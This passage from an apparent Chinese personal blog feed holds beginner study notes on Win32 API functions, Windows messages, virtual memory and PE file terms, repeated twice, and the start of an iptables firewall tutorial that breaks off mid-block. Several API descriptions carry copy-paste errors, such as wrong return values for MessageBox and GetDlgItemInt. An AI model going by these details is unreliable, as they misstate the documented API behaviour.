class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetWindowTextA,Unicode版是GetWindowTextW.</p><h2 id="2、GetDlgItem函数"><a href="#2、GetDlgItem函数" class="headerlink" title="2、GetDlgItem函数"></a>2、GetDlgItem函数</h2><p>此函数在USER32.DLL用户模块中，它的作用是获取制定对话框的句柄。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function">HWND <span class="title">GetDlgItem</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,<span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem<span class="comment">//控件标识</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div><div class="line">```.</div><div class="line">返回值：如果成功就返回对话框句柄，失败就返回零。</div><div class="line">## <span class="number">3</span>、GetDlgItemText函数</div><div class="line">此函数在USER32.DLL用户模块中，它的作用是获取对话框的文本。</div><div class="line">函数原型：</div><div class="line">```C</div><div class="line"><span class="function">UINT <span class="title">GetDlgItemText</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,  <span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem,<span class="comment">//控件标识(ID号)</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpString,<span class="comment">//缓冲区地址</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nMaxCount<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetDlgItemTextA,Unicode版是GetDlgItemTextW.</p><h2 id="4、GetDlgItemInt函数"><a href="#4、GetDlgItemInt函数" class="headerlink" title="4、GetDlgItemInt函数"></a>4、GetDlgItemInt函数</h2><p>此函数在USER32.DLL用户模块中，它的作用是获取对话框的整数。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">GetDlgItemInt</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,  <span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem,<span class="comment">//控件标识(ID号)</span></span></span></div><div class="line"><span class="function"><span class="params">BOOL *lpTranslated,<span class="comment">//接收成功/失败指示的指针</span></span></span></div><div class="line"><span class="function"><span class="params">BOOL bSigned<span class="comment">//指定为有符号还是无符号</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetDlgItemIntA,Unicode版是GetDlgItemIntW.</p><h2 id="5、MessageBox函数"><a href="#5、MessageBox函数" class="headerlink" title="5、MessageBox函数"></a>5、MessageBox函数</h2><p>此函数在USER32.DLL用户模块中，创建和显示信息框<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">MessageBox</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hWnd,  <span class="comment">//父窗口句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpText,<span class="comment">//消息框文本地址</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpCaption,<span class="comment">//消息框标题地址</span></span></span></div><div class="line"><span class="function"><span class="params">UINT uType<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是MessageBoxA,Unicode版是MessageBoxW.</p><h1 id="三、什么是句柄"><a href="#三、什么是句柄" class="headerlink" title="三、什么是句柄"></a>三、什么是句柄</h1><p>句柄(Handle)在Windows中使用非常频繁，它是Windows标识，由应用程序建立或使用的对象所使用的一个唯一的整数值(通常32位)。程序通过调用Windows函数获取句柄，然后在其他Window函数中使用这个句柄，以引用它代表的的对象。句柄的实际值对程序来说无关紧要。</p><h1 id="四、Windows消息机制"><a href="#四、Windows消息机制" class="headerlink" title="四、Windows消息机制"></a>四、Windows消息机制</h1><p>Windows是一个消息(Message)驱动式系统，Windows消息提供应用程序与应用程序，应用程序与Windows系统之间进行通信的手段。应用程序想要实现的 功能由消息来触发，并且靠对消息的响应和处理来完成。<br>Windows系统中有两种消息列队:一种是系统消息列队，另一种是应用程序消息列队。计算机的所有输入设备由Windows监控。当一个事件发生时，Windwos先将输入的消息放入系统消息队列中，再将输入的消息拷贝到相应的程序队列中，应用程序中的消息循环从它的消息队列中检索每个消息并且发给相应的窗口函数中。总是按到达的先后排队(一些系统消息除外)，这就使得一些外部实时事件可能得不到及时的处理。</p><h2 id="1、SendMessage函数"><a href="#1、SendMessage函数" class="headerlink" title="1、SendMessage函数"></a>1、SendMessage函数</h2><p>调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT <span class="title">SendMessage</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hWnd,<span class="comment">//目的窗口的句柄</span></span></span></div><div class="line"><span class="function"><span class="params">UINT Msg,<span class="comment">//消息标识符</span></span></span></div><div class="line"><span class="function"><span class="params">WPARAM wParam,<span class="comment">//消息的WPARAM域</span></span></span></div><div class="line"><span class="function"><span class="params">LPARAM lParam<span class="comment">//消息的LPARAM域</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：由具体的消息决定，如消息投递成功，返回TURE(非零)</p><h2 id="2、WM-COMMAND消息"><a href="#2、WM-COMMAND消息" class="headerlink" title="2、WM_COMMAND消息"></a>2、WM_COMMAND消息</h2><p>当用户从菜单或按钮中选择一条命令或者一个控件发给它的父窗口，或者当一个快捷键被释放时发送。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">WM_COMMAND</div><div class="line">wNotifyCode = HIWORD(wParam);<span class="comment">//通告代码</span></div><div class="line">wID = LOWORD(wParam)   <span class="comment">//菜单条目，控件标识符</span></div><div class="line">hwndCtl = (HWND) lParam, <span class="comment">//控件句柄</span></div><div class="line">)</div></pre></td></tr></table></figure></p><p>返回值：系统处理这条消息，返回零</p><h1 id="五、虚拟内存"><a href="#五、虚拟内存" class="headerlink" title="五、虚拟内存"></a>五、虚拟内存</h1><p>虚拟内存(Virtual Memory)不是真正的内存,他通过映射(Map)的方法，使可使用的虚拟地址(Virtual Address)达到4GB。<br>简单地说，虚拟内存的实现方法和过程如下:</p><p>(1)当一个应用程序被启动时，操作系统就创建一个新进程，并给每个进程分配2GB的虚拟地址(不是内存，是地址)<br>(2)虚拟内存管理器将应用程序的代码映射到那个程序代码的物理地址中的某个位置，并把当前所需要的代码读取到物理地址中(虚拟地址和应用程序代码在的物理内存中的位置是没有关系的)<br>(3)如果使用动态链接库DLL,DLL也被映射到进程的虚拟地址的空间，在需要的时候才被读入物理内存<br>(4)其它项目(例如数据，堆栈等)的空间是从物理内存中分配的，并被映射到虚拟空间中<br>(5)应用程序通过使用它的虚拟地址空间中的地址开始执行，然后虚拟内存管理器每次把内存的内存访问映射到物理位置<br>如果上面步骤不能理解，那明白以下几点就可以了：<br>1、应用程序不会直接访问物理地址<br>2、虚拟内存管理器通过虚拟地址的访问请求，控制所有的物理地址访问<br>3、每个应用程序都有互相独立的4GB寻址空间，不同应用程序的地址空间是隔离的<br>4、DLL程序没有自己”私有”空间，它们总是被映射打其它应用程序的地址空间。</p><h2 id="使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。"><a href="#使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。" class="headerlink" title="使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。"></a>使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。</h2><h1 id="六、简单介绍PE"><a href="#六、简单介绍PE" class="headerlink" title="六、简单介绍PE"></a>六、简单介绍PE</h1><p>Windows的可执行文件(EXE,DLL)是PE(Portable Executable)格式。PE文件使用的一个平面地址空间 ，所有的数据都被合并在一起，组成一个很大的结构。文件的内容被分割成不同的区块(Section,又称区段，节等)，块中包含代码和数据。每一个块都有他自己在内存中的一套属性(可读，可写等)。<br>每一个区块都有不同的名字，这个名字表示区块代码的功能。常见的区块有.text,.rdata,.data,.rsrc等<br>.text:是在编译或汇编结束时产生的一种块，它的内容全是指令代码<br>.rdata:是运行期只读数据<br>.data:是初始化的数据块<br>.idata:包含其它外来DLL的函数技巧数据，即输入表。<br>.rsrc:包含模块的全部资源，如图标，菜单，位图等。<br>PE文件非常好的一个地方就是在磁盘上的数据与内存中的结构图是一致的。<br><img src="http://chuantu.biz/t6/190/1514609990x-1566657870.png" alt=""><br>PE相关的名词解释如下:<br>(1)入口点(Entry Point)<br>PE文件执行时的入口点。也就是程序在执行时的第一行代码的地址应该是就这个值。<br>(2)文件偏移地址(File Offset)<br>当PE文件存储在磁盘上时，各数据的地址称做文件偏移地址 ，文件偏移地址从PE文件的第一个字节开始计数，起始值是0<br>(3)虚拟地址(Virtual Address,VA)<br>由于Windows程序运行在386保护模式下，所以程序访问存储器所使用的逻辑地址称为虚拟地址VA,又称为内存偏移地址。<br>(4)基地址(ImageBase)<br>文件执行时将被映射到指定的地址中，这个初始化内存地址称为基地址，这个值是由PE文件本身设定的。<br>(5)相对虚拟地址(Relative Virual Address,RVA)<br>表示此段代码在内存中相对于基地址的偏移,即：<br>相对虚拟地址（RVA）=虚拟地址（VA）-基址（ImageBase）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迟迟没有学习的加密与解密，现在开始吧&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>加密与解密——基础篇</title>
    <link href="http://yoursite.com/2017/12/30/encode_and_decode_base/"/>
    <id>http://yoursite.com/2017/12/30/encode_and_decode_base/</id>
    <published>2017-12-30T02:02:57.605Z</published>
    <updated>2018-03-07T00:31:12.696Z</updated>
    
    <content type="html"><![CDATA[<p>迟迟没有学习的加密与解密，现在开始吧<br><a id="more"></a></p><h1 id="一、Win-API简介"><a href="#一、Win-API简介" class="headerlink" title="一、Win API简介"></a>一、Win API简介</h1><p>API(Application Programming Interface)应用程序编程接口。在早期，windows的主要部分只需要三个动态链接库中实现，这代表了windows三个主要子系统——Kernel,User和GDI.<br>Kernel:操作系统的核心功能服务，包括进程与线程控制，内存管理，文件访问等。<br>User:负责处理用户接口，包括键盘和鼠标输入，窗口和菜单管理等。<br>GDI:图形设备接口，允许程序在屏幕上和打印机上显示文本和图像。</p><h1 id="二、常用的Win32-API函数"><a href="#二、常用的Win32-API函数" class="headerlink" title="二、常用的Win32 API函数"></a>二、常用的Win32 API函数</h1><h2 id="1、GetWindowText函数"><a href="#1、GetWindowText函数" class="headerlink" title="1、GetWindowText函数"></a>1、GetWindowText函数</h2><p>此函数在USER32.DLL用户模块中，它的作用是取得一个窗体的标题文字，或者一个文本控件的内容。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetWindowText</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hwnd,  <span class="comment">//窗口或文本控件句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpString,<span class="comment">//缓冲区地址</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nMaxCount<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetWindowTextA,Unicode版是GetWindowTextW.</p><h2 id="2、GetDlgItem函数"><a href="#2、GetDlgItem函数" class="headerlink" title="2、GetDlgItem函数"></a>2、GetDlgItem函数</h2><p>此函数在USER32.DLL用户模块中，它的作用是获取制定对话框的句柄。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function">HWND <span class="title">GetDlgItem</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,<span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem<span class="comment">//控件标识</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回对话框句柄，失败就返回零。</p><h2 id="3、GetDlgItemText函数"><a href="#3、GetDlgItemText函数" class="headerlink" title="3、GetDlgItemText函数"></a>3、GetDlgItemText函数</h2><p>此函数在USER32.DLL用户模块中，它的作用是获取对话框的文本。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">GetDlgItemText</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,  <span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem,<span class="comment">//控件标识(ID号)</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpString,<span class="comment">//缓冲区地址</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nMaxCount<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetDlgItemTextA,Unicode版是GetDlgItemTextW.</p><h2 id="4、GetDlgItemInt函数"><a href="#4、GetDlgItemInt函数" class="headerlink" title="4、GetDlgItemInt函数"></a>4、GetDlgItemInt函数</h2><p>此函数在USER32.DLL用户模块中，它的作用是获取对话框的整数。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">GetDlgItemInt</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,  <span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem,<span class="comment">//控件标识(ID号)</span></span></span></div><div class="line"><span class="function"><span class="params">BOOL *lpTranslated,<span class="comment">//接收成功/失败指示的指针</span></span></span></div><div class="line"><span class="function"><span class="params">BOOL bSigned<span class="comment">//指定为有符号还是无符号</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetDlgItemIntA,Unicode版是GetDlgItemIntW.</p><h2 id="5、MessageBox函数"><a href="#5、MessageBox函数" class="headerlink" title="5、MessageBox函数"></a>5、MessageBox函数</h2><p>此函数在USER32.DLL用户模块中，创建和显示信息框<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">MessageBox</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hWnd,  <span class="comment">//父窗口句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpText,<span class="comment">//消息框文本地址</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpCaption,<span class="comment">//消息框标题地址</span></span></span></div><div class="line"><span class="function"><span class="params">UINT uType<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是MessageBoxA,Unicode版是MessageBoxW.</p><h1 id="三、什么是句柄"><a href="#三、什么是句柄" class="headerlink" title="三、什么是句柄"></a>三、什么是句柄</h1><p>句柄(Handle)在Windows中使用非常频繁，它是Windows标识，由应用程序建立或使用的对象所使用的一个唯一的整数值(通常32位)。程序通过调用Windows函数获取句柄，然后在其他Window函数中使用这个句柄，以引用它代表的的对象。句柄的实际值对程序来说无关紧要。</p><h1 id="四、Windows消息机制"><a href="#四、Windows消息机制" class="headerlink" title="四、Windows消息机制"></a>四、Windows消息机制</h1><p>Windows是一个消息(Message)驱动式系统，Windows消息提供应用程序与应用程序，应用程序与Windows系统之间进行通信的手段。应用程序想要实现的 功能由消息来触发，并且靠对消息的响应和处理来完成。<br>Windows系统中有两种消息列队:一种是系统消息列队，另一种是应用程序消息列队。计算机的所有输入设备由Windows监控。当一个事件发生时，Windwos先将输入的消息放入系统消息队列中，再将输入的消息拷贝到相应的程序队列中，应用程序中的消息循环从它的消息队列中检索每个消息并且发给相应的窗口函数中。总是按到达的先后排队(一些系统消息除外)，这就使得一些外部实时事件可能得不到及时的处理。</p><h2 id="1、SendMessage函数"><a href="#1、SendMessage函数" class="headerlink" title="1、SendMessage函数"></a>1、SendMessage函数</h2><p>调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT <span class="title">SendMessage</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hWnd,<span class="comment">//目的窗口的句柄</span></span></span></div><div class="line"><span class="function"><span class="params">UINT Msg,<span class="comment">//消息标识符</span></span></span></div><div class="line"><span class="function"><span class="params">WPARAM wParam,<span class="comment">//消息的WPARAM域</span></span></span></div><div class="line"><span class="function"><span class="params">LPARAM lParam<span class="comment">//消息的LPARAM域</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：由具体的消息决定，如消息投递成功，返回TURE(非零)</p><h2 id="2、WM-COMMAND消息"><a href="#2、WM-COMMAND消息" class="headerlink" title="2、WM_COMMAND消息"></a>2、WM_COMMAND消息</h2><p>当用户从菜单或按钮中选择一条命令或者一个控件发给它的父窗口，或者当一个快捷键被释放时发送。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">WM_COMMAND</div><div class="line">wNotifyCode = HIWORD(wParam);<span class="comment">//通告代码</span></div><div class="line">wID = LOWORD(wParam)   <span class="comment">//菜单条目，控件标识符</span></div><div class="line">hwndCtl = (HWND) lParam, <span class="comment">//控件句柄</span></div><div class="line">)</div></pre></td></tr></table></figure></p><p>返回值：系统处理这条消息，返回零</p><h1 id="五、虚拟内存"><a href="#五、虚拟内存" class="headerlink" title="五、虚拟内存"></a>五、虚拟内存</h1><p>虚拟内存(Virtual Memory)不是真正的内存,他通过映射(Map)的方法，使可使用的虚拟地址(Virtual Address)达到4GB。<br>简单地说，虚拟内存的实现方法和过程如下:</p><p>(1)当一个应用程序被启动时，操作系统就创建一个新进程，并给每个进程分配2GB的虚拟地址(不是内存，是地址)<br>(2)虚拟内存管理器将应用程序的代码映射到那个程序代码的物理地址中的某个位置，并把当前所需要的代码读取到物理地址中(虚拟地址和应用程序代码在的物理内存中的位置是没有关系的)<br>(3)如果使用动态链接库DLL,DLL也被映射到进程的虚拟地址的空间，在需要的时候才被读入物理内存<br>(4)其它项目(例如数据，堆栈等)的空间是从物理内存中分配的，并被映射到虚拟空间中<br>(5)应用程序通过使用它的虚拟地址空间中的地址开始执行，然后虚拟内存管理器每次把内存的内存访问映射到物理位置<br>如果上面步骤不能理解，那明白以下几点就可以了：<br>1、应用程序不会直接访问物理地址<br>2、虚拟内存管理器通过虚拟地址的访问请求，控制所有的物理地址访问<br>3、每个应用程序都有互相独立的4GB寻址空间，不同应用程序的地址空间是隔离的<br>4、DLL程序没有自己”私有”空间，它们总是被映射打其它应用程序的地址空间。</p><h2 id="使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。"><a href="#使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。" class="headerlink" title="使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。"></a>使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。</h2><h1 id="六、简单介绍PE"><a href="#六、简单介绍PE" class="headerlink" title="六、简单介绍PE"></a>六、简单介绍PE</h1><p>Windows的可执行文件(EXE,DLL)是PE(Portable Executable)格式。PE文件使用的一个平面地址空间 ，所有的数据都被合并在一起，组成一个很大的结构。文件的内容被分割成不同的区块(Section,又称区段，节等)，块中包含代码和数据。每一个块都有他自己在内存中的一套属性(可读，可写等)。<br>每一个区块都有不同的名字，这个名字表示区块代码的功能。常见的区块有.text,.rdata,.data,.rsrc等<br>.text:是在编译或汇编结束时产生的一种块，它的内容全是指令代码<br>.rdata:是运行期只读数据<br>.data:是初始化的数据块<br>.idata:包含其它外来DLL的函数技巧数据，即输入表。<br>.rsrc:包含模块的全部资源，如图标，菜单，位图等。<br>PE文件非常好的一个地方就是在磁盘上的数据与内存中的结构图是一致的。<br><img src="http://chuantu.biz/t6/190/1514609990x-1566657870.png" alt=""><br>PE相关的名词解释如下:<br>(1)入口点(Entry Point)<br>PE文件执行时的入口点。也就是程序在执行时的第一行代码的地址应该是就这个值。<br>(2)文件偏移地址(File Offset)<br>当PE文件存储在磁盘上时，各数据的地址称做文件偏移地址 ，文件偏移地址从PE文件的第一个字节开始计数，起始值是0<br>(3)虚拟地址(Virtual Address,VA)<br>由于Windows程序运行在386保护模式下，所以程序访问存储器所使用的逻辑地址称为虚拟地址VA,又称为内存偏移地址。<br>(4)基地址(ImageBase)<br>文件执行时将被映射到指定的地址中，这个初始化内存地址称为基地址，这个值是由PE文件本身设定的。<br>(5)相对虚拟地址(Relative Virual Address,RVA)<br>表示此段代码在内存中相对于基地址的偏移,即：<br>相对虚拟地址（RVA）=虚拟地址（VA）-基址（ImageBase）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迟迟没有学习的加密与解密，现在开始吧&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Liunx下的iptables</title>
    <link href="http://yoursite.com/2017/12/19/iptables/"/>
    <id>http://yoursite.com/2017/12/19/iptables/</id>
    <published>2017-12-19T12:20:31.231Z</published>
    <updated>2017-12-19T14:14:33.509Z</updated>
    
    <content type="html"><![CDATA[<p>iptables是linux下的防火墙，得好好学习。<br><a id="more"></a></p><h2 id="1、iptables是什么"><a href="#1、iptables是什么" class="headerlink" title="1、iptables是什么"></a>1、iptables是什么</h2><p>iptables是netfilter的基本框架，即liunx发行版下的防火墙，其实就是过滤数据包。<br>举个栗子: 当Internet来了一个主机，想要进入主机。这时，会先经过iptables的规则，检查通过则接受(accept),否则，就会丢弃(drop)。iptables的规则是有顺序的，从开始配置，若是某一条匹配成功，则执行这条规则，后面的规则都不会执行。当所有的规则都不匹配，则丢弃(drop).</p><h2 id="1、iptables的策略"><a href="#1、iptables的策略" class="headerlink" title="1、iptables的策略"></a>1、iptables的策略</h2><p>一般分为两种策略: “通”策略(定义只有指定ip能访问)和”堵”策略(所有的都能访问，但是有身份认证)</p><p>因为iptable有许多的规则，所有我们定义了许多的表(table),每个表的规则都不一样。比如filter,nat，mangle</p><p>数据包中允许或者不允许进入本机——filter(过滤器)<br>地址转换的功能的则是——nat(地址转换)<br>修改报文原数据的标志位——mangle(数据包修改QOS)</p><h2 id="2、iptables常见的表"><a href="#2、iptables常见的表" class="headerlink" title="2、iptables常见的表"></a>2、iptables常见的表</h2><p>每个表中有许多的规则链</p><p>filter(过滤器)——主要用于防火墙<br><code>INPUT</code>:处理输入数据包规则链<br><code>OUTPUT</code>:处理输出数据包规则链<br><code>FORWARD</code>:将来到本机的数据包转发到其它主机(这里与nat有关)的规则链</p><p>nat(地址转换)<br><code>PREROUTING</code> :地址转换前的规则<br><code>POSTROUTING</code>:地址转换后的规则<br><code>OUTPUT</code>: 与发送出去的数据包有关</p><p>mangle(修改数据包）<br>mangle表的主要功能是根据规则修改数据包的一些标志位，以便其他规则或程序可以利用这种标志对数据包进行过滤或策略路由。</p><p>最常用的是filter表，我们的主要学习对象</p><h2 id="3、iptables命令"><a href="#3、iptables命令" class="headerlink" title="3、iptables命令"></a>3、iptables命令</h2><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>iptables (选项) (参数)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">-t&lt;表&gt;：指定要操纵的表； </div><div class="line">-A：向规则链中添加条目,添加到尾部； </div><div class="line">-D：从规则链中删除条目； </div><div class="line">-I：向规则链中插入条目,默认添加到首部； </div><div class="line">-R：替换规则链中的条目； </div><div class="line">-L：显示规则链中已有的条目； </div><div class="line">-F：清楚规则链中已有的条目； </div><div class="line">-Z：清空规则链中的数据包计算器和字节计数器； </div><div class="line">-N：创建新的用户自定义规则链； </div><div class="line">-P：定义规则链中的默认目标； </div><div class="line">-h：显示帮助信息； </div><div class="line">-p：指定要匹配的数据包协议类型； </div><div class="line">-s：指定要匹配的数据包源ip地址； </div><div class="line">-j&lt;目标&gt;：指定要跳转的目标； </div><div class="line">-i&lt;网络接口&gt;：指定数据包进入本机的网络接口； </div><div class="line">-o&lt;网络接口&gt;：指定数据包要离开本机所使用的网络接口。</div></pre></td></tr></table></figure></p><h4 id="iptables命令选项输入顺序："><a href="#iptables命令选项输入顺序：" class="headerlink" title="iptables命令选项输入顺序："></a>iptables命令选项输入顺序：</h4><p><code>iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源IP/源子网&gt; --sport 源端口 &lt;-d 目标IP/目标子网&gt; --dport 目标端口 -j 动作</code></p><h4 id="一些动作"><a href="#一些动作" class="headerlink" title="一些动作"></a>一些动作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">accept：接收数据包。 </div><div class="line">DROP：丢弃数据包。 </div><div class="line">REDIRECT：重定向、映射、透明代理。 </div><div class="line">SNAT：源地址转换。 </div><div class="line">DNAT：目标地址转换。 </div><div class="line">MASQUERADE：IP伪装（NAT），用于ADSL。 </div><div class="line">LOG：日志记录。</div></pre></td></tr></table></figure><h4 id="添加规则-如-屏蔽ip"><a href="#添加规则-如-屏蔽ip" class="headerlink" title="添加规则(如:屏蔽ip)"></a>添加规则(如:屏蔽ip)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -j DROP #屏蔽所有IP的命令 </div><div class="line">iptables -A INPUT -s 192.168.1.25 -j DROP #将这条命令添加到规则的尾部，屏蔽单个IP的命令 </div><div class="line">iptables -I INPUT -s 192.168.1.1/24 -j DROP #封整个段即从192.168.1.0到192.168.1.255的命令</div></pre></td></tr></table></figure><h4 id="删除规则"><a href="#删除规则" class="headerlink" title="删除规则"></a>删除规则</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -D INPUT -s 192.168.1.25 -j DROP #将这条命令从规则中删除</div><div class="line">iptables -D INPUT 2 #删除INPUT里面的第2条规则(从最上面开始)</div></pre></td></tr></table></figure><h4 id="限定某个ip登录ssh"><a href="#限定某个ip登录ssh" class="headerlink" title="限定某个ip登录ssh"></a>限定某个ip登录ssh</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div 